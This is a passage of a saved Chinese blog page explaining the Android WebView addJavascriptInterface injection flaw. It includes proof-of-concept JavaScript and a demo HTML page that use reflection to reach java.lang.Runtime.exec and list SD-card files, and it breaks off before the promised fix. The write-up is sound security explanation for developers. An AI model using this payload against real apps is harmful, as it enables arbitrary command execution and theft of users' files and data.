+                      <img class="arrow-down" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/arrow_triangle _down.jpg" style="display:inline;">
+                      <img class="arrow-up" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/arrow_triangle_up.jpg" style="display:none;">
+                        <div class="subItem">
+                            <div class="subItem_t"><a href="http://blog.csdn.net/leehong2005/article/category/1086396" target="_blank">作者同类文章</a><i class="J_close">X</i></div>
+                            <ul class="subItem_l" id="top_1086396">                            
+                            </ul>
+                        </div>
+                    </label>                    
+        </div>
+    </div>
+    <script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/category.js"></script>  
+        <div class="bog_copyright">         
+            <p class="copyright_p">版权声明：本文为博主原创文章，未经博主允许不得转载。</p>
+        </div>
+
+  
+
+  
+  
+     
+
+<div style="clear:both"></div><div style="border:solid 1px #ccc; background:#eee; float:left; min-width:200px;padding:4px 10px;"><p style="text-align:right;margin:0;"><span style="float:left;">目录<a href="http://blog.csdn.net/leehong2005/article/details/11808557#" title="系统根据文章中H1到H6标签自动生成文章目录">(?)</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" onclick="javascript:return openct(this);" title="展开">[+]</a></p><ol style="display:none;margin-left:14px;padding-left:14px;line-height:160%;"><li><a href="http://blog.csdn.net/leehong2005/article/details/11808557#t0">1使用场景</a></li><li><a href="http://blog.csdn.net/leehong2005/article/details/11808557#t1">2漏洞描述</a></li><li><a href="http://blog.csdn.net/leehong2005/article/details/11808557#t2">3漏洞证明</a></li><li><a href="http://blog.csdn.net/leehong2005/article/details/11808557#t3">4解决方案</a></li><li><a href="http://blog.csdn.net/leehong2005/article/details/11808557#t4">5一些思考</a></li></ol></div><div style="clear:both"></div><div id="article_content" class="article_content">
+
+<p>最近在做一个项目过程中，发现了一个很严重的安全漏洞，这个漏洞是乌云平台（http://www.wooyun.org）报告出来的。</p>
+<h2><a name="t0"></a>1，使用场景</h2>
+<div>我们很多时候要使用WebView来展示一个网页，现在很多应用为了做到服务端可控，很多结果页都是网页的，而不是本地实现，这样做有很多好处，比如界面的改变不需要重新发布新版本，直接在Server端修改就行了。用网页来展示界面，通常情况下都或多或少都与Java代码有交互，比如点击网页上面的一个按钮，我们需要知道这个按钮点击事件，或者我们要调用某个方法，让页面执行某种动作，为了实现这些交互，我们通常都是使用JS来实现，而WebView已经提供了这样的方法，具体用法如下：</div>
+<div>
+<div class="dp-highlighter bg_java"><div class="bar"><div class="tools"><b>[java]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 840px; top: 839px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_1" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_1" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=1&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-j"><li class="alt"><span><span>mWebView.getSettings().setJavaScriptEnabled(</span><span class="keyword">true</span><span>);&nbsp;&nbsp;</span></span></li><li class=""><span>mWebView.addJavascriptInterface(<span class="keyword">new</span><span>&nbsp;JSInterface(),&nbsp;</span><span class="string">"jsInterface"</span><span>);&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249" style="display: none;"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="java" style="display: none;">mWebView.getSettings().setJavaScriptEnabled(true);
+mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");</pre>
+我们向WebView注册一个名叫“jsInterface”的对象，然后在JS中可以访问到jsInterface这个对象，就可以调用这个对象的一些方法，最终可以调用到Java代码中，从而实现了JS与Java代码的交互。</div>
+<div>我们一起来看看关于addJavascriptInterface方法在Android官网的描述：</div>
+<div>
+<ul style="margin:0px 2.5em; padding:0px; font-family:Roboto,sans-serif; font-size:14px; line-height:19px; background-color:rgb(249,249,249)">
+<li style="margin:0px 0px 0.25em; padding:0px">This method can be used to allow JavaScript to control the host application. This is a powerful feature, but also presents a security risk for applications targeted to API level&nbsp;<code style="font-size:13px; line-height:14px"><a target="_blank" href="http://developer.android.com/reference/android/os/Build.VERSION_CODES.html#JELLY_BEAN" style="text-decoration:none">JELLY_BEAN</a></code>&nbsp;or
+ below, because JavaScript could use reflection to access an injected object's public fields. Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways, executing Java code with
+ the permissions of the host application. Use extreme care when using this method in a WebView which could contain untrusted content.</li><li style="margin:0px 0px 0.25em; padding:0px">JavaScript interacts with Java object on a private, background thread of this WebView. Care is therefore required to maintain thread safety.</li><li style="margin:0px 0px 0.25em; padding:0px">The Java object's fields are not accessible.</li></ul>
+<div><br>
+</div>
+简单地说，就是用addJavascriptInterface可能导致不安全，因为JS可能包含恶意代码。今天我们要说的这个漏洞就是这个，当JS包含恶意代码时，它可以干任何事情。</div>
+<div><br>
+</div>
+<h2><a name="t1"></a>2，漏洞描述</h2>
+<div>通过JavaScript，可以访问当前设备的SD卡上面的任何东西，甚至是联系人信息，短信等。这很恶心吧，嘎嘎。好，我们一起来看看是怎么出现这样的错误的。可以去看看乌云平台上的这个bug描述：<a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2010-036131/auth/3488a336fe230cb6928cf2444a53663f">猛点这里</a></div>
+<div>1，WebView添加了JavaScript对象，并且当前应用具有读写SDCard的权限，也就是：android.permission.WRITE_EXTERNAL_STORAGE</div>
+<div>2，JS中可以遍历window对象，找到存在“getClass”方法的对象的对象，然后再通过反射的机制，得到Runtime对象，然后调用静态方法来执行一些命令，比如访问文件的命令.</div>
+<div>3，再从执行命令后返回的输入流中得到字符串，就可以得到文件名的信息了。然后想干什么就干什么，好危险。核心JS代码如下：</div>
+<div>
+<div class="dp-highlighter bg_javascript"><div class="bar"><div class="tools"><b>[javascript]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 877px; top: 1578px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_2" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_2" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=2&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-c"><li class="alt"><span><span class="keyword">function</span><span>&nbsp;execute(cmdArgs)&nbsp;&nbsp;</span></span></li><li class=""><span>{&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">for</span><span>&nbsp;(</span><span class="keyword">var</span><span>&nbsp;obj&nbsp;</span><span class="keyword">in</span><span>&nbsp;window)&nbsp;{&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>&nbsp;(</span><span class="string">"getClass"</span><span>&nbsp;</span><span class="keyword">in</span><span>&nbsp;window[obj])&nbsp;{&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(obj);&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span><span>&nbsp;&nbsp;window[obj].getClass().forName(</span><span class="string">"java.lang.Runtime"</span><span>)&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.getMethod(<span class="string">"getRuntime"</span><span>,</span><span class="keyword">null</span><span>).invoke(</span><span class="keyword">null</span><span>,</span><span class="keyword">null</span><span>).exec(cmdArgs);&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class=""><span>}&nbsp;&nbsp;&nbsp;</span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="javascript" style="display: none;">function execute(cmdArgs)
+{
+&nbsp; &nbsp; for (var obj in window) {
+&nbsp; &nbsp; &nbsp; &nbsp; if ("getClass" in window[obj]) {
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alert(obj);
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return &nbsp;window[obj].getClass().forName("java.lang.Runtime")
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+&nbsp; &nbsp; &nbsp; &nbsp; }
+&nbsp; &nbsp; }
+}&nbsp;</pre>
+<br>
+</div>
+<h2><a name="t2"></a>3，漏洞证明</h2>
+<div><strong>举例一：</strong>为了证明这个漏洞，写了一个demo来说明。我就只是加载一个包含恶意JS代码的本地网页，HTML其代码如下：</div>
+<div>
+<div class="dp-highlighter bg_html"><div class="bar"><div class="tools"><b>[html]</b> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="ViewSource" title="view plain" onclick="dp.sh.Toolbar.Command(&#39;ViewSource&#39;,this);return false;">view plain</a><span data-mod="popu_168"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="CopyToClipboard" title="copy" onclick="dp.sh.Toolbar.Command(&#39;CopyToClipboard&#39;,this);return false;">copy</a><div style="position: absolute; left: 842px; top: 1948px; width: 18px; height: 18px; z-index: 99;"><embed id="ZeroClipboardMovie_3" src="http://static.blog.csdn.net/scripts/ZeroClipboard/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="18" height="18" name="ZeroClipboardMovie_3" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=3&amp;width=18&amp;height=18" wmode="transparent"></div></span><span data-mod="popu_169"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="PrintSource" title="print" onclick="dp.sh.Toolbar.Command(&#39;PrintSource&#39;,this);return false;">print</a></span><a href="http://blog.csdn.net/leehong2005/article/details/11808557#" class="About" title="?" onclick="dp.sh.Toolbar.Command(&#39;About&#39;,this);return false;">?</a></div></div><ol start="1" class="dp-xml"><li class="alt"><span><span class="tag">&lt;</span><span class="tag-name">html</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">head</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">meta</span><span>&nbsp;</span><span class="attribute">http-equiv</span><span>=</span><span class="attribute-value">"Content-Type"</span><span>&nbsp;</span><span class="attribute">content</span><span>=</span><span class="attribute-value">"text/html;&nbsp;charset=UTF-8"</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">script</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">i</span><span>=</span><span class="attribute-value">0</span><span>;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getContents(inputStream)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">contents</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">""</span><span>+i;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">b</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">inputStream</span><span>.read();&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">i</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">1</span><span>;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(b&nbsp;!=&nbsp;-1)&nbsp;{&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">bString</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">String</span><span>.fromCharCode(b);&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contents&nbsp;+=&nbsp;bString;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;contents&nbsp;+=&nbsp;"\n"&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">b</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">inputStream</span><span>.read();&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">i</span><span>=</span><span class="attribute-value">i</span><span>+1;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;contents;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;execute(cmdArgs)&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;obj&nbsp;in&nbsp;window)&nbsp;{&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(obj);&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;("getClass"&nbsp;in&nbsp;window[obj])&nbsp;{&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(obj);&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;window[obj].getClass().forName("java.lang.Runtime").&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">p</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">execute</span><span>(["ls","/mnt/sdcard/"]);&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.write(getContents(p.getInputStream()));&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;/</span><span class="tag-name">script</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">script</span><span>&nbsp;</span><span class="attribute">language</span><span>=</span><span class="attribute-value">"javascript"</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;onButtonClick()&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Call&nbsp;the&nbsp;method&nbsp;of&nbsp;injected&nbsp;object&nbsp;from&nbsp;Android&nbsp;source.&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">text</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">jsInterface</span><span>.onButtonClick("从JS中传递过来的文本！！！");&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(text);&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;onImageClick()&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Call&nbsp;the&nbsp;method&nbsp;of&nbsp;injected&nbsp;object&nbsp;from&nbsp;Android&nbsp;source.&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">src</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">document</span><span>.getElementById("image").src;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">width</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">document</span><span>.getElementById("image").width;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;<span class="attribute">height</span><span>&nbsp;=&nbsp;</span><span class="attribute-value">document</span><span>.getElementById("image").height;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Call&nbsp;the&nbsp;method&nbsp;of&nbsp;injected&nbsp;object&nbsp;from&nbsp;Android&nbsp;source.&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jsInterface.onImageClick(src,&nbsp;width,&nbsp;height);&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;/</span><span class="tag-name">script</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;<span class="tag">&lt;/</span><span class="tag-name">head</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">body</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">p</span><span class="tag">&gt;</span><span>点击图片把URL传到Java代码</span><span class="tag">&lt;/</span><span class="tag-name">p</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">img</span><span>&nbsp;</span><span class="attribute">class</span><span>=</span><span class="attribute-value">"curved_box"</span><span>&nbsp;</span><span class="attribute">id</span><span>=</span><span class="attribute-value">"image"</span><span>&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">onclick</span><span>=</span><span class="attribute-value">"onImageClick()"</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">width</span><span>=</span><span class="attribute-value">"328"</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">height</span><span>=</span><span class="attribute-value">"185"</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">src</span><span>=</span><span class="attribute-value">"http://t1.baidu.com/it/u=824022904,2596326488&amp;fm=21&amp;gp=0.jpg"</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="attribute">onerror</span><span>=</span><span class="attribute-value">"this.src='background_chl.jpg'"</span><span class="tag">/&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;/</span><span class="tag-name">p</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="tag">&lt;</span><span class="tag-name">button</span><span>&nbsp;</span><span class="attribute">type</span><span>=</span><span class="attribute-value">"button"</span><span>&nbsp;</span><span class="attribute">onclick</span><span>=</span><span class="attribute-value">"onButtonClick()"</span><span class="tag">&gt;</span><span>与Java代码交互</span><span class="tag">&lt;/</span><span class="tag-name">button</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;<span class="tag">&lt;/</span><span class="tag-name">body</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span><span class="tag">&lt;/</span><span class="tag-name">html</span><span class="tag">&gt;</span><span>&nbsp;&nbsp;</span></span></li></ol><div class="save_code tracking-ad" data-mod="popu_249"><a href="javascript:;" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/save_snippets.png"></a></div></div><pre name="code" class="html" style="display: none;">&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+    &lt;script&gt;
+      var i=0;
+      function getContents(inputStream)
+      {
+        var contents = ""+i;
+        var b = inputStream.read();
+        var i = 1;
+        while(b != -1) {
+            var bString = String.fromCharCode(b);
+            contents += bString;
+            contents += "\n"
+            b = inputStream.read();
+        }
+        i=i+1;
+        return contents;
+       }
+      
+       function execute(cmdArgs)
+       {
+        for (var obj in window) {
+            console.log(obj);
+            if ("getClass" in window[obj]) {
+                alert(obj);
+                return window[obj].getClass().forName("java.lang.Runtime").
+                    getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+         }
+       } 
+      
+      var p = execute(["ls","/mnt/sdcard/"]);
+      document.write(getContents(p.getInputStream()));
+    &lt;/script&gt;
+
+    &lt;script language="javascript"&gt;
+      function onButtonClick() 
+      {
+        // Call the method of injected object from Android source.
+        var text = jsInterface.onButtonClick("从JS中传递过来的文本！！！");
+        alert(text);
+      }
+
+      function onImageClick() 
+      {
+        //Call the method of injected object from Android source.
+        var src = document.getElementById("image").src;
+        var width = document.getElementById("image").width;
+        var height = document.getElementById("image").height;
+
+        // Call the method of injected object from Android source.
+        jsInterface.onImageClick(src, width, height);
+      }
+    &lt;/script&gt;
+  &lt;/head&gt;
+
+  &lt;body&gt;
+      &lt;p&gt;点击图片把URL传到Java代码&lt;/p&gt;
+      &lt;img class="curved_box" id="image" 
+         onclick="onImageClick()"
+         width="328"
+         height="185"
+         src="http://t1.baidu.com/it/u=824022904,2596326488&amp;fm=21&amp;gp=0.jpg"
+         onerror="this.src='background_chl.jpg'"/&gt;
+    &lt;/p&gt;
+    &lt;button type="button" onclick="onButtonClick()"&gt;与Java代码交互&lt;/button&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre>
+这段HTML的运行效果如下：</div>
+<div><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/20130928164619281" alt=""><br>
+</div>
+<div>图一：期望运行结果图</div>
+<div><br>
+</div>
+<div>上图中，点击<span style="color:#ff0000">按钮</span>后，JS中传递 一段文本到Java代码，显示一下个toast，点击<span style="color:#ff0000">图片</span>后，把图片的URL，width，height传到Java层，也用toast显示出来。</div>
+<div>要实现这样的功能，就需要注Java对象。</div>
+<div><br>
